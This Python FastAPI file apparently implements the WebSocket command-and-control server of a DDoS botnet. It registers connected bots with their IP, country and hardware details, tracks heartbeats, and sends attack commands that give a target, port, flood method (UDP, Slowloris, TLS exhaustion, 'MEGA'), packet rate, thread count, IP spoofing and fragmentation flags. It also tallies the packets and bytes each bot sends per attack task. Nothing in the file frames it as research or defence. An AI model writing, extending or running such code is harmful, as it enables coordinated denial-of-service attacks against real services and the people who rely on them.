import json
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional
from uuid import UUID
from fastapi import WebSocket, WebSocketDisconnect
from app.services.bot_service import BotService
from app.database import async_session
from app.models.all_models import Bot, AttackTask, AttackLog
from sqlalchemy import select

def _try_uuid(val: str) -> Optional[UUID]:
    try:
        return UUID(str(val))
    except (ValueError, AttributeError, TypeError):
        return None

class BotConnectionManager:
    def __init__(self):
        self.active: Dict[str, WebSocket] = {}
        self._last_stats: Dict[str, tuple] = {}
        self._lock = asyncio.Lock()
        self._last_heartbeat: Dict[str, datetime] = {}
        self._hb_task = None
        # task_id -> set of bot_ids that reported attack_done
        self._task_done: Dict[str, set] = {}

    async def _start_heartbeat_checker(self):
        while True:
            await asyncio.sleep(15)
            cutoff = datetime.now(timezone.utc) - timedelta(seconds=60)
            async with self._lock:
                stale = [k for k, t in list(self._last_heartbeat.items()) if t < cutoff]
                for k in stale:
                    ws = self.active.get(k)
                    if ws:
                        try:
                            await ws.close()
                        except Exception:
                            pass
                    self.active.pop(k, None)
                    self._last_stats.pop(k, None)
                    self._last_heartbeat.pop(k, None)
                    uid = _try_uuid(k)
                    if uid:
                        try:
                            await BotService.set_status(uid, "offline")
                        except Exception:
                            pass

    async def connect(self, ws: WebSocket, bot_id: str):
        await ws.accept()
        async with self._lock:
            old = self.active.get(bot_id)
            if old and old is not ws:
                try:
                    await old.close(code=1000)
                except Exception:
                    pass
            self.active[bot_id] = ws
            self._last_heartbeat[bot_id] = datetime.now(timezone.utc)
            if self._hb_task is None:
                self._hb_task = asyncio.create_task(self._start_heartbeat_checker())
        # DB status update offline path only — avoid slow DB on connect race

    async def disconnect(self, bot_id: str, ws: Optional[WebSocket] = None):
        async with self._lock:
            key = str(bot_id)
            cur = self.active.get(key)
            if ws is not None and cur is not None and cur is not ws:
                return
            if key in self.active and (ws is None or self.active[key] is ws):
                ws_to_close = self.active.pop(key, None)
                self._last_stats.pop(key, None)
                self._last_heartbeat.pop(key, None)
                uid = _try_uuid(key)
                if uid:
                    try:
                        await BotService.set_status(uid, "offline")
                    except Exception:
                        pass
                # Force-close the WebSocket if we have it
                if ws_to_close:
                    try:
                        await ws_to_close.close(code=1000)
                    except Exception:
                        pass

    async def rebind(self, old_key: str, new_key: str, ws: WebSocket):
        async with self._lock:
            if old_key != new_key:
                if self.active.get(old_key) is ws:
                    self.active.pop(old_key, None)
                    self._last_heartbeat.pop(old_key, None)
                if old_key in self._last_stats:
                    self._last_stats[new_key] = self._last_stats.pop(old_key)
            existing = self.active.get(new_key)
            if existing is not None and existing is not ws:
                try:
                    await existing.close()
                except Exception:
                    pass
            self.active[new_key] = ws
            self._last_heartbeat[new_key] = datetime.now(timezone.utc)

    def _find_ws(self, bot_id: str):
        """Resolve WS by DB id or any active key matching the same socket."""
        key = str(bot_id)
        ws = self.active.get(key)
        if ws is not None:
            return key, ws
        # Fallback: scan values (small fleet)
        for k, w in list(self.active.items()):
            if k == key:
                return k, w
        return None, None

    async def send_json(self, bot_id: str, data: dict) -> bool:
        key, ws = self._find_ws(bot_id)
        if not ws:
            print(f"[WS] send_json miss bot_id={bot_id} active={list(self.active.keys())}")
            return False
        try:
            await ws.send_json(data)
            return True
        except Exception as e:
            print(f"[WS] send_json fail bot={key}: {type(e).__name__}: {e}")
            # Do not tear down on every send fail — bot may reconnect
            return False

    async def send_attack_command(self, bot_id: str, task: dict):
        method = (task.get("method") or "UDP").upper()
        flags = {
            "slowloris": 1 if method == "SLOWLORIS" or task.get("slowloris") else 0,
            "tls_exhaust": 1 if method == "TLS_EXHAUST" or task.get("tls_exhaust") else 0,
            "mega_mode": 1 if method == "MEGA" or task.get("mega_mode") else 0,
        }
        ok = await self.send_json(bot_id, {
            "type": "attack",
            "task_id": task["id"],
            "target": task["target"],
            "port": task["port"],
            "method": method,
            "duration": task["duration"],
            "max_pps": task.get("pps", 100000),
            "max_threads": task.get("threads", 100),
            "spoof_mode": task.get("spoof_mode", 0),
            "fragmentation": task.get("fragmentation", 0),
            **flags,
        })
        print(f"[WS] attack cmd bot={bot_id} method={method} ok={ok}")

    async def send_stop_command(self, bot_id: str, task_id: str):
        await self.send_json(bot_id, {"type": "stop", "task_id": task_id})

    def stats_delta(self, bot_id: str, packets: int, bytes_: int) -> tuple:
        """Convert cumulative counters from bot into deltas."""
        last_p, last_b = self._last_stats.get(bot_id, (0, 0))
        # Reset if bot counters restarted (new attack)
        if packets < last_p:
            last_p, last_b = 0, 0
        dp = max(0, packets - last_p)
        db = max(0, bytes_ - last_b)
        self._last_stats[bot_id] = (packets, bytes_)
        return dp, db

manager = BotConnectionManager()

async def handle_bot_websocket(ws: WebSocket, bot_id: str):
    """bot_id from URL path — UUID v4 generated by bot.
    Online testers: connect wss://host/ws/bot/<uuid> then optionally send handshake JSON.
    """
    print(f"[WS] new connection bot_id={bot_id}")
    try:
        await manager.connect(ws, bot_id)
    except Exception as e:
        print(f"[WS] manager.connect failed for {bot_id}: {e}")
        try:
            await ws.close()
        except Exception:
            pass
        return
    session_key = bot_id
    print(f"[WS] bot {bot_id} connected, sending ack")

    try:
        # Flat JSON only — nested "type" broke naive bot parsers
        await ws.send_json({"type": "connected", "bot_id": bot_id})
        print(f"[WS] connected frame sent to {bot_id}, waiting for handshake")
    except Exception as e:
        print(f"[WS] send connected failed {bot_id}: {e}")
        await manager.disconnect(session_key, ws)
        return

    try:
        while True:
            try:
                message = await ws.receive()
            except RuntimeError as re:
                # Starlette: "Cannot call receive once a disconnect message has been received"
                print(f"[WS] bot {session_key} receive RuntimeError: {re}")
                break

            mtype = message.get("type")
            if mtype == "websocket.disconnect":
                code = message.get("code", 1000)
                print(f"[WS] bot {session_key} client disconnect code={code}")
                break
            if mtype != "websocket.receive":
                print(f"[WS] bot {session_key} unexpected ASGI type={mtype}")
                continue

            raw = message.get("text")
            if raw is None:
                # binary frame — ignore but log
                b = message.get("bytes") or b""
                print(f"[WS] bot {session_key} binary frame len={len(b)} (ignored)")
                continue

            print(f"[WS] bot {session_key} recv {len(raw)} bytes: {raw[:200]}")
            try:
                data = json.loads(raw)
            except json.JSONDecodeError:
                print(f"[WS] invalid JSON from {session_key}: {raw[:120]}")
                try:
                    await ws.send_json({"type": "error", "message": "Invalid JSON"})
                except Exception:
                    pass
                continue
            msg_type = data.get("type", "")

            if msg_type == "ping" or msg_type == "echo":
                await ws.send_json({"type": "pong", "echo": data})
                continue

            if msg_type == "handshake":
                print(f"[WS] bot {session_key} handshake received")
                try:
                    identifier = data.get("bot_identifier") or data.get("bot_id") or bot_id
                    handshake_bot_id = data.get("bot_id", bot_id)
                    uid = _try_uuid(str(handshake_bot_id)) or _try_uuid(str(bot_id))
                    if not uid:
                        await ws.send_json({"type": "error", "message": "Invalid bot_id (must be UUID)"})
                        continue

                    db_id = str(uid)
                    # 1) Ack immediately — zero DB before this
                    await ws.send_json({
                        "type": "handshake_ack",
                        "bot_id": db_id,
                        "max_pps": 100000,
                        "max_threads": 100,
                        "config": {"max_pps": 100000, "max_threads": 100},
                    })
                    print(f"[WS] handshake_ack sent bot={db_id}")

                    # 2) Register session keys (in-memory only)
                    await manager.rebind(session_key, db_id, ws)
                    session_key = db_id
                    manager._last_heartbeat[session_key] = datetime.now(timezone.utc)

                    # 3) Persist bot async so we never block the WS loop
                    payload = {
                        "identifier": str(identifier)[:128],
                        "uid": str(uid),
                        "ip": data.get("ip_address"),
                        "country": data.get("country"),
                        "os_name": (data.get("os_name") or data.get("os_version") or "Linux")[:64],
                        "cpu_cores": data.get("cpu_cores") or 1,
                        "ram_total_mb": data.get("ram_total_mb") or 0,
                        "net_speed_mbps": data.get("net_speed_mbps") or 0,
                        "version": (data.get("version") or "")[:32],
                    }

                    async def _persist_bot(p=payload):
                        try:
                            u = UUID(p["uid"])
                            async with async_session() as s:
                                bot = (await s.execute(
                                    select(Bot).where(Bot.bot_identifier == p["identifier"])
                                )).scalar_one_or_none()
                                if not bot:
                                    bot = (await s.execute(select(Bot).where(Bot.id == u))).scalar_one_or_none()
                                if not bot:
                                    s.add(Bot(
                                        id=u,
                                        bot_identifier=p["identifier"],
                                        ip_address=p["ip"] or None,
                                        country=p["country"],
                                        os_name=p["os_name"],
                                        cpu_cores=p["cpu_cores"],
                                        ram_total_mb=p["ram_total_mb"],
                                        net_speed_mbps=p["net_speed_mbps"],
                                        status="online",
                                        first_seen_at=datetime.now(timezone.utc),
                                        last_heartbeat_at=datetime.now(timezone.utc),
                                        bot_version=p["version"],
                                    ))
                                else:
                                    if p["ip"]:
                                        bot.ip_address = p["ip"]
                                    bot.status = "online"
                                    bot.last_heartbeat_at = datetime.now(timezone.utc)
                                    bot.cpu_cores = p["cpu_cores"]
                                    bot.ram_total_mb = p["ram_total_mb"]
                                    bot.os_name = p["os_name"]
                                    if p["version"]:
                                        bot.bot_version = p["version"]
                                await s.commit()
                        except Exception as dbe:
                            print(f"[WS] handshake DB persist fail: {dbe}")

                    asyncio.create_task(_persist_bot())
                except WebSocketDisconnect:
                    print(f"[WS] handshake aborted disconnect session={session_key}")
                    raise
                except Exception as e:
                    print(f"[WS] handshake error {session_key}: {type(e).__name__}: {e}")
                    import traceback
                    traceback.print_exc()
                    try:
                        await ws.send_json({"type": "error", "message": f"handshake failed: {type(e).__name__}"})
                    except Exception:
                        pass
                    continue

            elif msg_type == "heartbeat":
                uid = _try_uuid(session_key)
                if uid:
                    await BotService.update_heartbeat(uid, data)
                # Track for stale detection
                manager._last_heartbeat[session_key] = datetime.now(timezone.utc)
                try:
                    await ws.send_json({"type": "heartbeat_ack", "timestamp": data.get("timestamp")})
                except Exception:
                    pass

            elif msg_type == "attack_stats":
                task_id = data.get("task_id")
                uid = _try_uuid(session_key)
                if task_id and uid:
                    tid = _try_uuid(task_id)
                    if tid:
                        raw_pkts = int(data.get("packets_sent", 0) or 0)
                        raw_bytes = int(data.get("bytes_sent", 0) or 0)
                        dp, db = manager.stats_delta(session_key, raw_pkts, raw_bytes)
                        if dp or db:
                            async with async_session() as s:
                                s.add(AttackLog(
                                    task_id=tid, bot_id=uid,
                                    packets_sent=dp, bytes_sent=db,
                                ))
                                task = (await s.execute(
                                    select(AttackTask).where(AttackTask.id == tid)
                                )).scalar_one_or_none()
                                if task:
                                    task.total_packets = (task.total_packets or 0) + dp
                                    task.total_bytes = (task.total_bytes or 0) + db
                                await s.commit()

            elif msg_type == "attack_done":
                task_id = data.get("task_id")
                tid = _try_uuid(task_id) if task_id else None
                if tid:
                    tkey = str(tid)
                    done = manager._task_done.setdefault(tkey, set())
                    done.add(session_key)
                    async with async_session() as s:
                        task = (await s.execute(
                            select(AttackTask).where(AttackTask.id == tid, AttackTask.status == "running")
                        )).scalar_one_or_none()
                        if task:
                            n_bots = len(task.bot_ids or []) or 1
                            if len(done) >= n_bots:
                                task.status = "completed"
                                task.completed_at = datetime.now(timezone.utc)
                                await s.commit()
                                manager._task_done.pop(tkey, None)
                                print(f"[WS] task {tkey} completed ({len(done)}/{n_bots} bots done)")

    except WebSocketDisconnect as e:
        code = getattr(e, "code", None)
        print(f"[WS] bot {session_key} disconnected code={code}")
        await manager.disconnect(session_key, ws)
    except Exception as e:
        print(f"[WS] bot {session_key} error: {type(e).__name__}: {e}")
        try:
            await manager.disconnect(session_key, ws)
        except Exception:
            pass
    finally:
        # Ensure cleanup even if we broke out of the loop without exception
        try:
            await manager.disconnect(session_key, ws)
        except Exception:
            pass
